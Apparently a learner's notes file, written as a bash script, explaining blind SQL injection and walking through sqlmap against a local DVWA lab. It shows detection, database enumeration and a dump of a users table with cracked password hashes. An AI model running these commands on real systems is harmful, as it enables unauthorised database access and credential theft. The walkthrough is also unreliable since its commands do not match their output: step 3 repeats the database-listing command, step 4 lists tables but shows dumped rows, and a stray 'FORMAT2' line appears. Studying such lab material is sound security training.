#!/bin/bash

# BLIND SQL INJECTION
  In real world applications, developers suppress error messages. Due to this, their is zero visibility of database errors or UNION SELECT outputs.
  But we can still inject - we just have to infer data from the application's behaviour rather than its output. This is known as Blind SQLi.
  There are two types:
  1. Boolean-based: Application behaves differently for TRUE vs FALSE conditions. You infer data one bit at a time.
  2. Time-based: Apllication takes longer to respond when you inject a time delay. You infer data by measuring response time.

# SQLMAP
  sqlmap is an open-source tool that automates SQL injection detection and exploitation.
  It handles all the tedious boolean-based and time-based extraction automatically and efficiently.
  Never run sqlmap against a target you don't have permission to test.
# SQLmap - Automated SQL Injection Tool
  # Get your DVWA session cookie first:
  # In Burp or browser DevTools: find PHPSESSID and security values
  # Example: PHPSESSID=abc123def456; security=low

  # Step 1: Detect SQLi vulnerabilities
    kali@kali:~$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="PHPSESSID=abc123; security=low" \
      --batch
    [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
    [INFO] the back-end DBMS is MySQL
  # Step 2: Extract databases
    kali@kali:~$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="PHPSESSID=abc123; security=low" \
      --dbs --batch
    'FORMAT2: kali@kali:~$ sqlmap -u "..." --cookie="..." --dbs --batch'
    available databases: [2] * information_schema * dvwa
  # Step 3: Extract tables from dvwa database
    kali@kali:~$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="PHPSESSID=abc123; security=low" \
      --dbs --batch
    Database: dvwa [2 tables] | guestbook | users
  # Step 4: Dump the users table
    kali@kali:~$ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
      --cookie="PHPSESSID=abc123; security=low" \
      -D dvwa --tables --batch
    +----+----------+---------------------------------------------+
    | id | user | password |
    +----+----------+---------------------------------------------+
    | 1 | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
    | 2 | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) |
    sqlmap even cracks common MD5 hashes automatically
# Key sqlmap flags to remember:
--dbs → list all databases
-D dbname → target specific database
--tables → list tables in database
-T tablename → target specific table
--dump → extract all rows from table
--batch → use defaults, no interactive prompts
--level=5 → more thorough testing (slower)
--risk=3 → more risky payloads (can modify data)
--forms → auto-detect and test all HTML forms
